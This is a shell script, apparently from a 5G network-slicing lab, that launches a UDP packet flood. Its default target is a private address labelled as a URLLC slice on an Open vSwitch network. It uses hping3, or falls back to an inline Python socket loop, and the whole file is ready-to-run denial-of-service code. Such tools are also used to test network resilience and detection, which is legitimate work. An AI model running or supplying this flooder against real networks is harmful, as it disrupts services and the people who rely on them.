#!/bin/sh
# Real UDP / TCP DoS Packet Flood Generator for Open vSwitch Network
TARGET_IP=${1:-"172.28.0.20"} # Default target: URLLC Slice
TARGET_PORT=${2:-"5001"}
PACKET_COUNT=${3:-"2000"}

echo "[ATTACK-DOS] Launching High-Rate UDP DoS Flood -> ${TARGET_IP}:${TARGET_PORT} (${PACKET_COUNT} packets)..."
if command -v hping3 > /dev/null 2>&1; then
    hping3 --udp -p "${TARGET_PORT}" -c "${PACKET_COUNT}" -i u100 "${TARGET_IP}" 2>&1
else
    # Fallback to python socket flooder
    python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b'X' * 1024
for _ in range(${PACKET_COUNT}):
    s.sendto(payload, ('${TARGET_IP}', int('${TARGET_PORT}')))
    time.sleep(0.0005)
print('DoS packet flood completed.')
"
fi
